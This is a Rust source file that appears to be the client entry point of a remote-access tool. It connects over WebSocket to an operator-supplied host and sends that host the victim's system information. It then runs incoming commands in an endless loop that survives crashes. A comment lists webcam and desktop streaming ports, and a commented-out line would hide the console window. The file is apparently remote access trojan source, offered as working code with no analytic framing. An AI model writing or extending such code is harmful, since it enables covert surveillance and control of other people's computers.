// #![windows_subsystem = "windows"]

use std::net::TcpStream;
use std::panic;
use std::str::FromStr;

use tungstenite::stream::MaybeTlsStream;
use tungstenite::{connect, WebSocket};

use crate::router::{handle_message, MessageType};
use crate::utils::SystemInformation;

mod handlers;
mod router;
mod utils;
pub type Socket = WebSocket<MaybeTlsStream<TcpStream>>;

/* Ports
4040 - Handling one-time messages
4043 - Webcam Streaming
4042 - Desktop Streaming
 */

#[derive(Clone)]
struct Connection {
    ip: String,
    port: i32,
}
fn main() {
    let args = std::env::args().collect::<Vec<String>>();
    let connection = Connection {
        ip: args.get(1).unwrap().to_owned(),
        port: i32::from_str(args.get(2).unwrap()).unwrap(),
    };
    connect_with_host(connection);
}

fn connect_with_host(connection: Connection) {
    let (mut socket, _response) =
        connect(format!("ws://{}:{}", connection.ip, connection.port)).expect("Can't connect");
    let sysinfo = SystemInformation::get().to_string();
    socket.send(sysinfo.into()).unwrap();

    loop {
        let res = panic::catch_unwind(panic::AssertUnwindSafe(|| {
            read_messages(&mut socket, connection.clone())
        }));
        if res.is_err() {
            continue;
        }
    }
}

fn read_messages(socket: &mut Socket, connection: Connection) {
    loop {
        let msg = socket.read();
        if let Ok(msg) = msg {
            let text = msg.into_text().unwrap();
            let bytes = text.as_bytes();
            let message_type =
                MessageType::from_char(bytes[0] as char).expect("Invalid message type");
            handle_message(message_type, &bytes[1..], socket, &connection);
        }
    }
}
